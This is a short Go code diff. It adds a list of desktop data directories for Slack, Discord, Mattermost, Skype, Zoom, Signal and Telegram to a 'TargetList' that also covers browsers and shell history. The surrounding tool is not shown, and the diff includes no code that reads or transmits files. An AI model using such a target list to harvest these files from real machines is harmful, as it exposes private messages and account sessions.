@@ -57,7 +57,24 @@ var shell = []string{
 	".history",
 }
 
+var messaging = []string{
+	".config/Slack/",
+	".config/discord/",
+	".config/Mattermost/",
+	".config/Skype/",
+	".zoom/",
+
+	// Signal
+	".config/Signal/",
+	".var/app/org.signal.Signal/",
+
+	// Telegram
+	".local/share/TelegramDesktop/",
+	".var/app/org.telegram.desktop/data/TelegramDesktop/",
+}
+
 var TargetList = [][]string{
 	browsers,
 	shell,
+	messaging,
 }
